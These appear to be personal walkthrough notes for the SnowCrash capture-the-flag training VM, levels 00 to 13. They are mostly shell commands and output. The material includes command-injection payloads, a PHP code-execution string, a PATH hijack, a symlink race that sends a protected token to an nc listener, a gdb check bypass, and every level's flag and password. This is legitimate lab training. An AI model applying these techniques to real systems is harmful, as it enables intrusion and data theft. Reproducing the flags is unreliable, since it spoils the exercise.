flag00:nottoohardhere (cmd: find / -user flag00 gives us /usr/sbin/john -> rot11) (see intra video)

flag01:abcdefg (./john passwd -> cat /etc/paswd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash)

flag02:ft_waNDReL0L (level02.pcap password clair) -> scp -P4242 level02@ip_address:/home/user/level02/level02.pcap .

flag03: spawn shell (cat /tmp/echo -> #!/bin/sh sh, puis on change la perm pour qu'il soit executable et on export PATH=/tmp:$PATH + getflag dans shell de flag03)

flag04: http://172.20.10.6:4747/?x=`getflag`

flag05:
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:/opt/openarenaserver$ echo "getflag >> /tmp/flag05" >> script
level05@SnowCrash:/opt/openarenaserver$ cat script
getflag >> /tmp/flag05
level05@SnowCrash:/opt/openarenaserver$ ls
script
level05@SnowCrash:/opt/openarenaserver$ ls (apres deux minutes max, le script s'execute avec le groupe flag05 et le script est removed du dossier)
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc

flag06:
level06@SnowCrash:~$ echo '[x {$y}]' >/tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
/tmp/getflag
level06@SnowCrash:~$ echo '[x {${system(sh)}}]' >/tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/user/level06/level06.php(4) : regexp code on line 1
getflag
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub

flag07:
level07@SnowCrash:~$ export LOGNAME=";getflag;"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

flag08:
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/key
level08@SnowCrash:~$ ls -la /tmp/key
lrwxrwxrwx 1 level08 level08 24 Dec 10 16:48 /tmp/key -> /home/user/level08/token
level08@SnowCrash:~$ /tmp/key
-bash: /tmp/key: Permission denied
level08@SnowCrash:~$ ./level08 /tmp/key
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

flag09:
create python script: test.py
import sys

string = sys.argv[1]
key = 0
result = ''
for char in string:
    result += chr(ord(char) + key)
    key -= 1

print '\nResult: {res}'.format(res = result)
level09@SnowCrash:~$ python /tmp/test.py $(cat token)
Result: f3iji1ju5yuevaus41q1afiuq
level09@SnowCrash:~$ su flag09
Password:
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z

flag10:
access race-condition exploit
first open port 6969 with nc -lk 6969
level10@SnowCrash:~$ ls -l level10 token
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/key; ln -sf /home/user/level10/level10 /tmp/key; done &
level10@SnowCrash:~$ while true; do ./level10 /tmp/key 10.12.1.113; done
You don't have access to /tmp/key
Connecting to 10.12.1.113:6969 .. Connected!
Sending file .. wrote file!
woupa2yuojeeaaed06riuj63c
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

flag11:
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
level11@SnowCrash:~$ netstat -ltnp
(No info could be read for "-p": geteuid()=2011 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: 1;/bin/getflag > /tmp/level12;echo 1
Erf nope..
level11@SnowCrash:~$ cat /tmp/level12
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

flag12:
level12@SnowCrash:~$ cat /tmp/TOKEN
#!/bin/sh
getflag > /tmp/key
level12@SnowCrash:~$ ./level12.pl "?x="`/*/TOKEN`""
/tmp/TOKEN: 2: /tmp/TOKEN: cannot create /tmp/key: Permission denied
Content-type: text/html

..level12@SnowCrash:~$ cat /tmp/key
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

flag13:
level13@SnowCrash:~$ gdb -q level13
Reading symbols from /home/user/level13/level13...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb)
(gdb) break main
Breakpoint 1 at 0x804858f
(gdb) r
Starting program: /home/user/level13/level13

Breakpoint 1, 0x0804858f in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x0804858c <+0>:	push   ebp
   0x0804858d <+1>:	mov    ebp,esp
=> 0x0804858f <+3>:	and    esp,0xfffffff0
   0x08048592 <+6>:	sub    esp,0x10
   0x08048595 <+9>:	call   0x8048380 <getuid@plt>
   0x0804859a <+14>:	cmp    eax,0x1092
   0x0804859f <+19>:	je     0x80485cb <main+63>
   0x080485a1 <+21>:	call   0x8048380 <getuid@plt>
   0x080485a6 <+26>:	mov    edx,0x80486c8
   0x080485ab <+31>:	mov    DWORD PTR [esp+0x8],0x1092
   0x080485b3 <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x080485b7 <+43>:	mov    DWORD PTR [esp],edx
   0x080485ba <+46>:	call   0x8048360 <printf@plt>
   0x080485bf <+51>:	mov    DWORD PTR [esp],0x1
   0x080485c6 <+58>:	call   0x80483a0 <exit@plt>
   0x080485cb <+63>:	mov    DWORD PTR [esp],0x80486ef
   0x080485d2 <+70>:	call   0x8048474 <ft_des>
   0x080485d7 <+75>:	mov    edx,0x8048709
   0x080485dc <+80>:	mov    DWORD PTR [esp+0x4],eax
   0x080485e0 <+84>:	mov    DWORD PTR [esp],edx
   0x080485e3 <+87>:	call   0x8048360 <printf@plt>
   0x080485e8 <+92>:	leave
   0x080485e9 <+93>:	ret
End of assembler dump.
(gdb) b *0x0804859a
Breakpoint 2 at 0x804859a
(gdb) c
Continuing.

Breakpoint 2, 0x0804859a in main ()
(gdb) p $eax
$1 = 2013
(gdb) set $eax = 4242
(gdb) p $eax
$2 = 4242
(gdb) c
Continuing.
your token is 2A31L79asukciNyi8uppkEuSx
[Inferior 1 (process 30790) exited with code 050]
level13@SnowCrash:~$ su level14
Password:
level14@SnowCrash:~$
